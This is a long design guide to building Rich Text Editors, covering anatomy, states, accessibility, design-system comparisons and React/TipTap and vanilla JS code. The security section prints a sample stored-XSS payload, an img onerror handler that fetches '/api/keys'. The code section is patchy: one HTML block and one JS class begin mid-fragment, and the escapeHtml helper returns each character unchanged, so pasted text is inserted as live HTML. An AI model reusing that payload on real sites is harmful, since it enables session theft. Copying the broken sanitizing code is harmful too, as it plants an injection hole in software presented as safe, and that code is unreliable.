# Rich Text Editor

# Rich Text Editor

A Rich Text Editor (RTE / WYSIWYG editor) is the component where a user writes formatted content — bold, italic, headings, lists, links, images, tables, mentions, embeds — and sees it rendered as they type, then hands you back a serializable document (HTML, JSON, or portable text). It is the single most dangerous, most complex, and most frequently botched component in any product. It touches contenteditable (a notoriously inconsistent browser API), accessibility (most shipped RTEs are unusable with a screen reader), and security (stored XSS is the number-one vulnerability an RTE introduces). Treat it like a small application, not a widget.
* * *

## 1\. What It Actually Is

A Rich Text Editor is an interactive editing surface that lets a user author _formatted, structured_ content and returns a _serialized document_ — not a plain string. It is built on the browser's `contenteditable` attribute (or a framework that abstracts it: TipTap/ProseMirror, Lexical, Slate, CKEditor, Quill), paired with a toolbar of formatting controls and a content model that maps the visible DOM to a portable representation you can store and re-render.

The defining property: **what the user sees is a live rendering of a document model, and every keystroke, paste, and toolbar click mutates that model through a controlled transaction — not by letting the browser do whatever it wants to the DOM.** Modern editors do NOT use `document.execCommand` (deprecated, never standardized, wildly inconsistent across browsers); they intercept input and apply changes to their own model, then render.

**The things people confuse it with:**

*   **Textarea / multiline text field.** A `<textarea>` holds a plain string. No formatting, no model, no toolbar. If the output is plain text, you do not want an RTE — you want a textarea (optionally with a character counter). RTEs cost 50–200KB and a mountain of a11y/security work; do not pay that for plain text.
*   **Markdown editor.** A Markdown editor edits _source text_ (`**bold**`) in a plain textarea and renders a preview elsewhere (or inline). The user types syntax; the editor does not hide it. An RTE hides syntax and shows the result. The two overlap in "Markdown-hybrid" editors that transform typed Markdown into rich formatting on the fly, but the mental model differs: Markdown = editing source, RTE = editing rendered output.
*   **Code editor (Monaco / CodeMirror).** A code editor is a specialized text editor with syntax highlighting, line numbers, and a monospace grid. It edits _code as plain text_ with decorations layered on top; it is not a rich-document editor. Never use an RTE to edit code and never use a code editor to author prose.
*   **Comment box / chat composer.** These are RTEs in miniature — usually bold/italic/link/mention/emoji only, single output target, aggressive paste-as-plain. They share mechanics but are scoped down so hard that treating them as a "full RTE" over-engineers them.

**Rule of thumb:** If the user needs to produce _formatted, structured content that you will store and re-render elsewhere_, and the formatting is semantic (headings, lists, links) rather than syntax the user types by hand, it is a Rich Text Editor. If the output is a plain string → textarea. If the user types and sees Markdown syntax → Markdown editor. If it is code → code editor.

## 2\. Why It Matters

*   **Security — stored XSS is the #1 risk in your entire product.** An RTE takes untrusted user input and renders it back as HTML, often to _other_ users. If you store raw HTML and re-render it without a server-side allowlist sanitizer, an attacker types `<img src=x onerror="fetch('/api/keys').then(...)">` once and you have persistent, wormable cross-site scripting that runs in every viewer's session. This is not hypothetical — it is the classic RTE breach. The stakes are session theft, account takeover, and CSRF-on-behalf-of-victim. No other common component has an attack surface this severe. §15 covers this in depth; it is the reason RTEs get pen-tested first.
*   **Accessibility — most shipped RTEs are broken, and that is a legal exposure.** `contenteditable` regions are frequently invisible to screen readers, toolbars steal focus from the editing caret, formatting state is never announced, and keyboard-only users cannot reach half the controls. An inaccessible content-authoring tool violates WCAG 2.2 and, for public/enterprise/government products, ADA / Section 508 / EN 301 549. If the tool your customers use to _create_ content cannot be operated by a disabled employee, that is a direct discrimination claim. RTE a11y is genuinely hard (§10) — which is exactly why doing it right is a differentiator, not a checkbox.
*   **Content integrity & portability — the output format decides your next five years.** An RTE's serialized output is a contract with every downstream system: your CMS, your email renderer, your mobile app, your search index, your AI pipeline. Storing tag-soup HTML that only one editor version can re-parse locks you in and rots. Storing a clean, versioned document model (portable JSON / structured HTML with an allowlist) lets you re-render anywhere, migrate editors, and diff revisions. Get the content model wrong and every future integration pays interest.
*   **Trust & polish — a janky editor makes the whole product feel broken.** Users spend real time in an editor. Lost cursor position on paste, formatting that "sticks" when it shouldn't, a toolbar that fights the caret, content that looks different after save than while typing — each one erodes confidence and drives rage-quits. The editor is where users _do the work_; if it stutters, the product feels amateur regardless of how good everything else is.
*   **Performance — the editor is on the critical path of the authoring experience.** A large document in a naive contenteditable re-lays-out on every keystroke; a heavy editor bundle blocks the compose page; unvirtualized long documents drop frames while typing. Slow input latency in the one place users type is unforgivable — it is measured in every keystroke.

## 3\. Anatomy

*   **Editing surface (the editable region).** The `contenteditable` element (usually a `div`, given `role="textbox"` `aria-multiline="true"`). This is where the caret lives and where content renders. It is NOT a form control — it does not submit with a form and needs explicit wiring. Min height ~200px, auto-grows with content, has a visible focus indicator.
*   **Toolbar.** The strip of formatting controls (`role="toolbar"`). Buttons for bold/italic/underline, heading level, lists, link, image, blockquote, code, alignment, undo/redo. Critically, it is a _real_ toolbar with roving tabindex and it must NOT steal focus from the editing surface when a button is pressed (see §10). Sticky at top on desktop, often bottom-anchored above the keyboard on mobile.
*   **Placeholder.** Muted prompt text shown when the document is empty ("Start writing…"). Rendered via CSS `:empty::before` or the framework's placeholder plugin — never as real content (it must not serialize).
*   **Floating / bubble toolbar.** A context toolbar that appears anchored to the current text selection (bold/italic/link). Preferred pattern for selection-scoped actions and for mobile, where a persistent toolbar competes with the on-screen keyboard.
*   **Slash / block-insert menu.** A `+` button or `/` command menu (a combobox/listbox) that inserts block-level content — headings, lists, images, tables, embeds, dividers. The Notion-style pattern. Needs full listbox a11y.
*   **Link editor popover.** The small form that appears when inserting/editing a link — URL field, optional text, open-in-new-tab toggle, remove button. A focus trap while open; returns focus to the selection on close.
*   **Selection & caret.** The current range within the document. The editor tracks it as model coordinates (not just DOM selection) so toolbar state (is bold active?) reflects the caret position, and so operations apply to the right range.
*   **Content model / document.** The in-memory tree (ProseMirror node tree, Lexical EditorState, Slate value) that is the source of truth. The visible DOM is a _rendering_ of this; edits go through the model, not directly to the DOM.
*   **Serializer / deserializer.** The functions that convert the model to storage format (HTML / JSON / Markdown) and back. Where sanitization hooks live on both directions.
*   **Status / count region.** Optional live region: word/character count, save status ("Saving…/Saved"), validation errors. Uses `aria-live` so it is announced without stealing focus.
*   **Undo/redo history.** The transaction stack. In collaborative editors this is per-user (undo my changes, not yours).

## 4\. Sizes / Scale / Density

RTEs scale along two axes: the _density of the chrome_ (toolbar button size, spacing) and the _footprint of the editing surface_. Toolbar controls follow icon-button sizing; the editing surface follows content-area sizing.

| Tier | Toolbar height | Toolbar button | Editing min-height | Body font | Line-height | Use case |
| ---| ---| ---| ---| ---| ---| --- |
| Compact (comment/chat) | 36px | 28×28px | 72px | 14px / `--rte-font-sm` | 1.5 | Comment boxes, chat composers, inline replies |
| Standard (default) | 44px | 32×32px | 200px | 16px / `--rte-font-md` | 1.6 | Blog posts, CMS body, email composer, help desk |
| Comfortable (long-form) | 52px | 40×40px | 480px | 18px / `--rte-font-lg` | 1.7 | Docs/Notion-style authoring, knowledge base, manuscript |

Rules that matter:

*   **Touch targets: 44×44px minimum (WCAG 2.5.5 / AAA; 24×24 is the 2.2 AA floor).** Compact 28px icons are fine with pointer/mouse but MUST expand hit area to ≥44px on coarse pointers (`@media (pointer: coarse)`) — pad the button, don't shrink the icon.
*   **Content width for readability: cap the editing measure at 60–75ch** even if the container is wider. Prose at full 1200px width is unreadable; the surface can be full-width while the text column is capped via `max-width: 68ch; margin-inline: auto`.
*   **Toolbar overflow:** when controls exceed the width, collapse least-used groups into an overflow "⋯ More" menu rather than wrapping to two rows (a two-row toolbar shoves the editing surface down and breaks sticky positioning).
*   **Spacing tokens:** `--rte-pad-x` (16px standard, 12px compact), `--rte-toolbar-gap` (4px between buttons, 8px between groups with a 1px divider). Group related controls (text style | lists | insert | history) with dividers.
*   **Responsive:** below ~640px, move the toolbar to bottom-anchored or switch to a floating selection toolbar; collapse to the essential set (bold/italic/link/list) with the rest behind overflow. Never let a 20-button toolbar wrap four times on a phone.

## 5\. States

The RTE has editor-level states, surface-level states, and per-control (toolbar button) states. All three matter.

Editor / surface states:

*   **Empty.** No content; placeholder visible. Model is a single empty paragraph. Word count 0. Save button typically disabled.
*   **Focused / editing.** Caret is in the surface; focus ring on the editable region; toolbar active and reflecting caret formatting. This is the working state.
*   **Blurred (has content, not focused).** Content rendered, no caret, no focus ring. Toolbar may dim its toggle states since there is no selection.
*   **Read-only / preview.** `contenteditable="false"` (or the framework's editable=false); no caret, toolbar hidden or disabled; content rendered for viewing. Used for published preview or permission-gated documents.
*   **Disabled.** Whole editor non-interactive and visually muted; often during a blocking save or when the user lacks edit permission. Distinct from read-only in intent (temporary/forbidden vs. viewing mode).
*   **Loading / hydrating.** Initial content is being fetched/deserialized; show a skeleton in the surface, disable the toolbar. Prevents a flash of empty → populated that loses caret.
*   **Saving / autosaving.** Content is being persisted; surface stays editable, status region announces "Saving…" then "Saved" (or "Save failed — retry"). Never block typing on autosave.
*   **Error.** Save failed, content failed to load, or validation failed (e.g. over max length, disallowed embed). Surface shows an inline error and the status region announces it via `aria-live="assertive"`.
*   **Uploading (media).** An inserted image/file is uploading; show an inline progress placeholder in the document that resolves to the final node or an error node.
*   **Composing (IME active).** An input-method composition is in progress (CJK, accents, autocomplete). The editor must NOT apply model transactions mid-composition (see §14) — this is a real state you handle, not decoration.
*   **Collaborative — remote edit / presence.** Another user's caret and selection are shown; content updates arrive without disturbing the local caret. Conflict-free by construction (CRDT/OT).

Toolbar button states (each control is a toggle or action button):

*   **Default / inactive.** Formatting not applied at caret.
*   **Active / pressed.** `aria-pressed="true"` — bold is on at the current selection; visually filled/highlighted.
*   **Hover / focus.** Standard affordance; focus visible via roving tabindex.
*   **Disabled.** Action invalid in context (e.g. "outdent" when not nested, "insert table" inside a table if disallowed).
*   **Mixed / indeterminate.** Selection spans both bold and non-bold text — the toggle shows a mixed state (neither fully on nor off).

## 6\. Types / Variants

*   **Minimal / inline.** Bold, italic, link only — often via a floating selection toolbar with no persistent chrome. For comment boxes and short-form. Output is a tiny HTML subset or plain-text-with-marks.
*   **Standard.** Headings, lists (ordered/unordered), bold/italic/underline, link, blockquote, inline code, image. The workhorse for blog/CMS body and email. Persistent top toolbar.
*   **Full / block editor (Notion-style).** Everything above plus tables, code blocks, embeds, videos, dividers, callouts, columns, drag-to-reorder blocks, and a slash/`+` insert menu. Content model is block-based (each block is a node); output is usually structured JSON/portable text rather than freeform HTML.
*   **Markdown-hybrid.** User types Markdown shortcuts (`#` , `**`, `-` , `>` ) which transform into rich formatting live, while the toolbar remains available. TipTap/ProseMirror input rules and Lexical do this well. Fast for keyboard-first writers.
*   **Comment / chat composer.** Minimal formatting + @mentions + emoji + paste-as-plain by default. Enter-to-send (Shift+Enter for newline) or the reverse, configurable. Aggressively strips pasted formatting.
*   **Collaborative editor.** Any of the above with real-time multi-user editing via CRDT (Yjs) or OT. Adds presence cursors, per-user undo, and offline merge. This is a _capability layer_, not a separate toolbar shape — but it changes the content model and sync architecture fundamentally.
*   **Email composer.** Standard RTE constrained to email-safe HTML (inline styles, table layouts, no `<script>`/JS, limited CSS). Output targets the lowest-common-denominator email client, which is a different serialization target than web.

## 7\. When to Use (and When Not To)

**Use a Rich Text Editor when:**

*   Users author _formatted, structured prose_ you will store and re-render — CMS/blog bodies, knowledge-base articles, documentation, product descriptions.
*   Email composition with formatting.
*   Comments/discussion that benefit from bold/links/mentions/quotes (scope it to the minimal variant).
*   Note-taking / document apps where blocks, tables, and embeds are core.
*   Any place a user's formatting choices carry meaning and must survive a round-trip through storage.

**Don't use one — use something else — when:**

*   The output is a plain string → **Textarea** (with an optional character counter). Do not pay the RTE's bundle/a11y/security tax for text with no formatting.
*   The user is comfortable with syntax and you want a smaller surface → **Markdown editor** (textarea + preview). Great for developer-facing tools and technical docs.
*   The content is code → **Code editor** (CodeMirror / Monaco).
*   You need a fixed set of structured fields → **Form** with typed inputs, not free-form rich text. Do not let people type a "profile" into an RTE when you actually want firstName/lastName/bio fields.
*   A single short formatted value like a title → a plain **Field**; titles should not be bold-able.

**Placement heuristics:** the editor is the primary content region of its screen — give it room, cap the text measure for readability, keep the toolbar within thumb reach on mobile, and put save/publish actions in a consistent, always-visible location (not buried in the toolbar). Never nest an RTE inside a tight modal where the toolbar and keyboard fight for space.

## 8\. Across Design Systems

*   **Material (MDC / Material 3).** Material does not ship a full RTE as a core component; teams typically wrap a third-party editor (Quill, TipTap) and skin the toolbar with Material icon buttons, 48dp touch targets, and the ripple/elevation language. Text fields cover plain input; rich text is explicitly "bring your own engine."
*   **Apple HIG.** iOS/macOS provide `UITextView`/`NSTextView` with `NSAttributedString` as the native rich-text substrate — a genuinely accessible, IME-correct native editor. On the web, Apple platforms lean on `contenteditable`. HIG guidance stresses selection handles, the inline formatting popover, and respecting the system text-editing gestures rather than reinventing them.
*   **Fluent (Microsoft).** Fluent UI does not ship an RTE primitive either; the Microsoft ecosystem uses the roosterjs editor and, in Office, a deeply custom engine. Fluent's contribution is the _toolbar/command-bar_ pattern (overflow menus, keytips) and rigorous keyboard/high-contrast support that an RTE toolbar should adopt.
*   **Ant Design.** Ant does not include an RTE; its docs explicitly recommend integrating `react-quill`, `braft-editor`, or similar and styling the toolbar with Ant buttons and tooltips. The pattern is "Ant chrome around a third-party engine."
*   **Tailwind / Tailwind UI.** No editor engine — Tailwind is styling only. The common stack is TipTap (headless, ProseMirror-based) with Tailwind classes on the toolbar and a `prose` typography plugin styling the editable surface. Tailwind's `@tailwindcss/typography` (`prose`) is the de-facto way to style rendered rich content.
*   **shadcn/ui + Radix.** shadcn provides no editor but supplies the exact primitives an RTE toolbar needs: Radix Toolbar (roving tabindex, `role="toolbar"`), Toggle/ToggleGroup (`aria-pressed` handled), Popover (link editor), and DropdownMenu (block insert). The idiomatic modern build is TipTap or Lexical for the engine + Radix Toolbar/Toggle for accessible chrome.
*   **Bootstrap.** Bootstrap has no RTE; the historical pairing is Quill or the legacy Summernote/TinyMCE with Bootstrap button groups (`.btn-group`, `role="toolbar"`) styling the controls.

**§ 8b — What's trending in 2026:** The field has consolidated around a few headless engines — **TipTap/ProseMirror**, **Lexical** (Meta), and **Slate** — with the toolbar/chrome left to the app's design system. Block-based, JSON-first content models (portable text) are displacing freeform HTML storage because they are safer to sanitize and easier to render across web/mobile/AI. Real-time collaboration via **Yjs (CRDT)** is now near table-stakes for document products. AI is embedded directly in the editor (inline "continue writing", slash-AI commands, selection rewrite) — which introduces its own prompt-injection surface. Visually, editors trend toward chromeless "focus mode" surfaces with floating/bubble toolbars and slash menus (Notion's influence), and mobile-first composition with bottom-anchored, keyboard-aware toolbars.
* * *

## 9\. The Code

The through-line for every target below: **do not use** **`document.execCommand`****.** It is deprecated, was never standardized, and behaves differently in every browser. Real editors either (a) use a maintained engine (TipTap/ProseMirror, Lexical, Slate) that owns the model and rendering, or (b) for a truly minimal editor, intercept `beforeinput`/`keydown`, apply changes via the Selection/Range API to a controlled surface, and sanitize on serialize. The examples use maintained engines where that is the honest production choice, and show a from-scratch controlled surface where the point is to illustrate the mechanics.

```html
              aria-label="Insert link" aria-pressed="false" aria-keyshortcuts="Control+K" tabindex="-1">

  <div id="rte-surface" class="rte__surface"

  <p id="rte-hint" class="rte__hint">Press Ctrl+B for bold, Ctrl+K to add a link.</p>
  <div class="rte__status" role="status" aria-live="polite"></div>
</figure>
```

### 9.3 React + TypeScript (full reusable component, TipTap engine)

```tsx
// RichTextEditor.tsx — production-shaped, headless engine + accessible toolbar.
// deps: @tiptap/react @tiptap/starter-kit @tiptap/extension-link dompurify
import { useCallback, useEffect, useId, useState } from 'react';
import { useEditor, EditorContent, type Editor } from '@tiptap/react';
import StarterKit from '@tiptap/starter-kit';
import Link from '@tiptap/extension-link';
import DOMPurify from 'dompurify';

export interface RichTextEditorProps {
  value?: string;                       // stored HTML
  onChange?: (html: string) => void;    // sanitized HTML out
  placeholder?: string;
  ariaLabel: string;                    // required: the surface must be labeled
  readOnly?: boolean;
  maxLength?: number;                   // characters (plain-text length)
}

const ALLOWED = {
  ALLOWED_TAGS: ['p','br','strong','em','u','s','a','h1','h2','h3','ul','ol','li','blockquote','code','pre','img'],
  ALLOWED_ATTR: ['href','target','rel','src','alt','title'],
};

function sanitize(html: string): string {
  return DOMPurify.sanitize(html, ALLOWED);
}

export function RichTextEditor({
  value = '', onChange, placeholder = 'Start writing…',
  ariaLabel, readOnly = false, maxLength,
}: RichTextEditorProps) {
  const surfaceId = useId();
  const [count, setCount] = useState(0);

  const editor = useEditor({
    editable: !readOnly,
    extensions: [
      StarterKit.configure({ heading: { levels: [1, 2, 3] } }),
      Link.configure({ openOnClick: false, autolink: true, HTMLAttributes: { rel: 'nofollow noopener', target: '_blank' } }),
    ],
    content: sanitize(value),
    editorProps: {
      attributes: {
        role: 'textbox', 'aria-multiline': 'true', 'aria-label': ariaLabel,
        class: 'rte__surface', spellcheck: 'true',
      },
      // Strip formatting on paste of foreign HTML: keep only allowed structure.
      transformPastedHTML: (html) => sanitize(html),
    },
    onUpdate: ({ editor }) => {
      const text = editor.getText();
      setCount(text.length);
      if (maxLength && text.length > maxLength) return; // enforce below
      onChange?.(sanitize(editor.getHTML()));
    },
  });

  useEffect(() => {
    if (editor && value !== editor.getHTML()) editor.commands.setContent(sanitize(value), false);
  }, [value, editor]);

  useEffect(() => {
    if (!editor || !maxLength) return;
    const handler = () => {
      if (editor.getText().length > maxLength) editor.commands.undo();
    };
    editor.on('update', handler);
    return () => { editor.off('update', handler); };
  }, [editor, maxLength]);

  if (!editor) return <div className="rte" aria-busy="true" />;

  return (
    <figure className="rte" role="group" aria-label={ariaLabel}>
      {!readOnly && <Toolbar editor={editor} surfaceId={surfaceId} />}
      <EditorContent editor={editor} id={surfaceId} />
      <div className="rte__status" role="status" aria-live="polite">
        {maxLength ? `${count} / ${maxLength}` : `${count} characters`}
      </div>
    </figure>
  );
}

// Roving-tabindex toolbar that does NOT steal focus from the surface.
function Toolbar({ editor, surfaceId }: { editor: Editor; surfaceId: string }) {
  const [focusIdx, setFocusIdx] = useState(0);
  const btns: Array<{ cmd: string; label: string; keys?: string; run: () => void; active: () => boolean }> = [
    { cmd: 'bold', label: 'Bold', keys: 'Control+B', run: () => editor.chain().focus().toggleBold().run(), active: () => editor.isActive('bold') },
    { cmd: 'italic', label: 'Italic', keys: 'Control+I', run: () => editor.chain().focus().toggleItalic().run(), active: () => editor.isActive('italic') },
    { cmd: 'h2', label: 'Heading 2', run: () => editor.chain().focus().toggleHeading({ level: 2 }).run(), active: () => editor.isActive('heading', { level: 2 }) },
    { cmd: 'ul', label: 'Bulleted list', run: () => editor.chain().focus().toggleBulletList().run(), active: () => editor.isActive('bulletList') },
    { cmd: 'link', label: 'Insert link', keys: 'Control+K', run: () => promptLink(editor), active: () => editor.isActive('link') },
  ];

  const onKeyDown = useCallback((e: React.KeyboardEvent) => {
    if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
    e.preventDefault();
    setFocusIdx((i) => {
      const next = e.key === 'ArrowRight' ? (i + 1) % btns.length : (i - 1 + btns.length) % btns.length;
      (e.currentTarget.querySelectorAll<HTMLButtonElement>('button')[next])?.focus();
      return next;
    });
  }, [btns.length]);

  return (
    <div className="rte__toolbar" role="toolbar" aria-label="Formatting" aria-controls={surfaceId} onKeyDown={onKeyDown}>
      {btns.map((b, i) => (
        <button key={b.cmd} type="button" className="rte__btn"
          aria-label={b.label} aria-pressed={b.active()} aria-keyshortcuts={b.keys}
          tabIndex={i === focusIdx ? 0 : -1}
          // onMouseDown preventDefault keeps the caret/selection in the surface.
          onMouseDown={(e) => e.preventDefault()}
          onClick={b.run} onFocus={() => setFocusIdx(i)}>
          {b.label === 'Heading 2' ? 'H2' : b.label === 'Bulleted list' ? '•' : b.label[0]}
        </button>
      ))}
    </div>
  );
}

function promptLink(editor: Editor) {
  const prev = editor.getAttributes('link').href as string | undefined;
  const url = window.prompt('URL', prev ?? 'https://');
  if (url === null) return;
  if (url === '') { editor.chain().focus().unsetLink().run(); return; }
  try {
    const u = new URL(url);
    if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) throw new Error('blocked scheme');
    editor.chain().focus().extendMarkRange('link').setLink({ href: u.href }).run();
  } catch { window.alert('Enter a valid http(s) or mailto URL'); }
}
```

```js
// rte.js — a minimal from-scratch editor: no execCommand, model = DOM, sanitize on read.
// Demonstrates the mechanics real engines hide: beforeinput, selection, roving toolbar.
export class MiniRTE {
  constructor(root) {
    this.surface = root.querySelector('.rte__surface');
    this.toolbar = root.querySelector('.rte__toolbar');
    this.buttons = [...this.toolbar.querySelectorAll('.rte__btn')];
    this.wire();
    this.refreshState();
  }

  wire() {
    // Keep caret in the surface when a button is pressed.
    this.toolbar.addEventListener('mousedown', (e) => {
      if (e.target.closest('.rte__btn')) e.preventDefault();
    });
    this.toolbar.addEventListener('click', (e) => {
      const btn = e.target.closest('.rte__btn');
      if (btn) this.exec(btn.dataset.cmd);
    });
    // Roving tabindex.
    this.toolbar.addEventListener('keydown', (e) => this.roving(e));
    // Keyboard shortcuts.
    this.surface.addEventListener('keydown', (e) => {
      if (!(e.ctrlKey || e.metaKey)) return;
      const map = { b: 'bold', i: 'italic', u: 'underline', k: 'link' };
      const cmd = map[e.key.toLowerCase()];
      if (cmd) { e.preventDefault(); this.exec(cmd); }
    });
    // Reflect caret formatting into toolbar toggles.
    document.addEventListener('selectionchange', () => {
      if (this.surface.contains(document.getSelection()?.anchorNode)) this.refreshState();
    });
    // Paste as clean text-with-basic-marks.
    this.surface.addEventListener('paste', (e) => {
      e.preventDefault();
      const html = e.clipboardData.getData('text/html');
      const text = e.clipboardData.getData('text/plain');
      const clean = html ? sanitizeInline(html) : escapeHtml(text).replace(/\n/g, '<br>');
      this.insertHTML(clean);
    });
  }

  exec(cmd) {
    if (cmd === 'link') {
      const url = prompt('URL', 'https://');
      if (!url) return;
      if (!/^https?:|^mailto:/.test(url)) return alert('Invalid URL scheme');
      this.wrapSelection('a', { href: url, rel: 'nofollow noopener', target: '_blank' });
    } else if (cmd === 'bold') this.wrapSelection('strong');
    else if (cmd === 'italic') this.wrapSelection('em');
    else if (cmd === 'underline') this.wrapSelection('u');
    this.refreshState();
    this.surface.focus();
  }

  wrapSelection(tag, attrs = {}) {
    const sel = document.getSelection();
    if (!sel.rangeCount || sel.isCollapsed) return;
    const range = sel.getRangeAt(0);
    const el = document.createElement(tag);
    for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, v);
    try { range.surroundContents(el); } catch { el.appendChild(range.extractContents()); range.insertNode(el); }
    sel.removeAllRanges();
  }

  insertHTML(html) {
    const sel = document.getSelection();
    if (!sel.rangeCount) return;
    const range = sel.getRangeAt(0);
    range.deleteContents();
    const frag = range.createContextualFragment(html);
    range.insertNode(frag);
    range.collapse(false);
  }

  refreshState() {
    for (const btn of this.buttons) {
      const tag = { bold: 'strong', italic: 'em', underline: 'u', link: 'a' }[btn.dataset.cmd];
      const on = tag ? isInside(document.getSelection()?.anchorNode, tag) : false;
      btn.setAttribute('aria-pressed', String(on));
    }
  }

  roving(e) {
    if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
    e.preventDefault();
    const i = this.buttons.indexOf(document.activeElement);
    const n = e.key === 'ArrowRight' ? (i + 1) % this.buttons.length : (i - 1 + this.buttons.length) % this.buttons.length;
    this.buttons.forEach((b, k) => b.tabIndex = k === n ? 0 : -1);
    this.buttons[n].focus();
  }

  getHTML() { return sanitizeInline(this.surface.innerHTML); }
}

function isInside(node, tag) {
  while (node && node !== document.body) {
    if (node.nodeType === 1 && node.tagName.toLowerCase() === tag) return true;
    node = node.parentNode;
  }
  return false;
}
const ALLOWED = new Set(['P','BR','STRONG','EM','U','S','A','H1','H2','H3','UL','OL','LI','BLOCKQUOTE','CODE','IMG']);
function sanitizeInline(html) {
  const t = document.createElement('template');
  t.innerHTML = html;
  t.content.querySelectorAll('*').forEach((el) => {
    if (!ALLOWED.has(el.tagName)) { el.replaceWith(...el.childNodes); return; }
    [...el.attributes].forEach((a) => {
      const ok = (el.tagName === 'A' && a.name === 'href') || (el.tagName === 'IMG' && ['src','alt'].includes(a.name));
      if (!ok) el.removeAttribute(a.name);
    });
    const href = el.getAttribute('href');
    if (href && !/^https?:|^mailto:/i.test(href)) el.removeAttribute('href'); // block javascript:
  });
  return t.innerHTML;
}
const escapeHtml = (s) => s.replace(/[&<>"']/g, (c) => ({ '&': '&', '<': '<', '>': '>', '"': '"', "'": '&#39;' }[c]));
```

```js
    this.#surface.setAttribute('aria-label', this.getAttribute('label') ?? 'Rich text');
    this.#toolbar.addEventListener('mousedown', (e) => { if (e.target.closest('button')) e.preventDefault(); });
    this.#toolbar.addEventListener('click', (e) => { const b = e.target.closest('button'); if (b) this.#exec(b.dataset.cmd); });
    this.#surface.addEventListener('keydown', (e) => {
      if (!(e.ctrlKey || e.metaKey)) return;
      const cmd = { b: 'bold', i: 'italic' }[e.key.toLowerCase()];
      if (cmd) { e.preventDefault(); this.#exec(cmd); }
    });
    this.#surface.addEventListener('input', () => this.#sync());
    this.#surface.addEventListener('paste', (e) => {
      e.preventDefault();
      const text = e.clipboardData.getData('text/plain');
      this.#surface.ownerDocument.getSelection().getRangeAt(0).insertNode(document.createTextNode(text));
      this.#sync();
    });
  }
  #exec(cmd) {
    const sel = this.shadowRoot.getSelection?.() ?? document.getSelection();
    if (!sel || sel.isCollapsed) return;
    const tag = cmd === 'bold' ? 'strong' : 'em';
    const el = document.createElement(tag);
    const r = sel.getRangeAt(0);
    try { r.surroundContents(el); } catch { el.appendChild(r.extractContents()); r.insertNode(el); }
    this.#sync();
  }
  #sync() { this.#internals.setFormValue(this.getHTML()); }
  getHTML() {
    const t = document.createElement('template');
    t.innerHTML = this.#surface.innerHTML;
    t.content.querySelectorAll('*').forEach((el) => { if (!ALLOWED.has(el.tagName)) el.replaceWith(...el.childNodes); });
    return t.innerHTML;
  }
}
```

## 10\. Accessibility

Accessibility is the hardest part of an RTE and the most-failed. A large share of shipped editors are effectively unusable with a screen reader or keyboard. Do not treat this as decoration.

**Roles & ARIA:**

*   The editing surface is `role="textbox"` `aria-multiline="true"`, with `aria-label` or `aria-labelledby`. If content can be invalid, add `aria-invalid` and reference the error with `aria-describedby`.
*   The toolbar is `role="toolbar"` with an `aria-label` and `aria-controls` pointing at the surface's id.
*   Toggle controls (bold/italic/heading/list) use a real `<button>` with `aria-pressed="true|false"`. Mixed selections should express an indeterminate state (visually distinct; announce "mixed").
*   Action controls (insert link/image) are plain buttons; the popovers they open are focus-trapped and labeled.
*   Declare shortcuts on the control with `aria-keyshortcuts` (e.g. `aria-keyshortcuts="Control+B"`).
*   Status/count/save messages go in an `aria-live="polite"` region (`assertive` only for errors). Never move focus to announce them.

**Keyboard map (interactive — every one of these must work):**

| Key | Action |
| ---| --- |
| Ctrl/Cmd + B | Toggle bold |
| Ctrl/Cmd + I | Toggle italic |
| Ctrl/Cmd + U | Toggle underline |
| Ctrl/Cmd + K | Insert/edit link |
| Ctrl/Cmd + Z / Shift+Z | Undo / redo |
| Ctrl/Cmd + Alt + 1..3 | Heading level 1–3 |
| Ctrl/Cmd + Shift + 7 / 8 | Ordered / bulleted list |
| Tab (in surface) | Insert tab / indent list item (NOT move focus, when in a list); otherwise moves focus out |
| Tab (into toolbar) | Focus the toolbar's active (roving) button — one tab stop |
| Arrow Left/Right (in toolbar) | Move between toolbar buttons (roving tabindex) |
| Enter | New paragraph/block |
| Shift + Enter | Soft line break (<br>) |
| Escape | Close open popover/menu, return focus to surface |

**Focus management (the make-or-break rule):** The toolbar must NEVER steal focus from the editing caret. When a user clicks a toolbar button, call `preventDefault()` on `mousedown` so the selection in the surface is preserved, then apply the command and return the caret (`chain().focus()` in TipTap). Tab into the toolbar is a _single_ stop (roving tabindex): one button is `tabindex="0"`, the rest `-1`, arrows move the roving focus. When a popover (link editor) opens, trap focus inside it; on close, return focus to exactly where the selection was. Losing the caret is the single most common RTE a11y failure.

**Contrast & non-text:** Toolbar icons and the focus ring must meet 3:1 against their background (WCAG 1.4.11 non-text contrast); body text 4.5:1. The active/pressed toggle state must be distinguishable by more than color alone (border + fill, not just a tint). The focus ring on the surface must be visible against both the surface background and any highlighted content.

**Target size:** Toolbar buttons ≥24×24px (WCAG 2.2 AA, 2.5.8) and ideally 44×44px on touch (2.5.5 AAA). Expand hit area on coarse pointers without shrinking the icon.

**Reduced motion:** Under `prefers-reduced-motion: reduce`, disable toolbar hover transitions, bubble-toolbar slide-ins, and any typing/caret animation. Content insertion should be instant, not animated.

**Common failures specific to RTEs:**

*   Editable region is a bare `contenteditable` div with no `role="textbox"`/`aria-multiline` — screen readers don't announce it as an editable field.
*   Toolbar built from `<div>`s with click handlers — not focusable, no `aria-pressed`, invisible to AT.
*   Formatting state never announced — a blind user can't tell whether the next character will be bold.
*   Toolbar steals focus, dumping the user out of the document on every click.
*   Every toolbar button is a separate tab stop — 20 tabs to get past the toolbar to the text.
*   `aria-pressed` omitted or never updated as the caret moves.
*   Placeholder implemented as real text content (serializes, and is read as content, not a prompt).
*   Images inserted with no way to add alt text — inaccessible output by construction.
*   Keyboard shortcuts collide with screen-reader or browser shortcuts and are swallowed.

## 11\. Innovative / Emerging Ideas

*   **CRDT collaboration by default (Yjs + editor bindings).** Conflict-free replicated data types make real-time multi-user editing and offline-then-merge the baseline, not a bolt-on. TipTap (`@tiptap/extension-collaboration` + Yjs) and Lexical's Yjs binding make presence cursors and per-user undo tractable. The 2026 expectation for any doc product.
*   **Inline AI as a first-class editor citizen.** Selection-scoped "rewrite / shorten / change tone", `/ai` slash commands, and ghost-text continuation are embedding directly into the editing surface. This is powerful and introduces a _prompt-injection_ surface (pasted content can carry hidden instructions) — treat AI features as untrusted-input handlers, not magic.
*   **The** **`EditContext`** **API (2024+, broad support landing).** A modern browser API that decouples text input (IME, autocorrect, virtual keyboards) from the DOM, letting editors handle composition and input events cleanly without fighting `contenteditable`'s quirks. This is the platform's answer to a decade of contenteditable pain and is where new engines are heading.
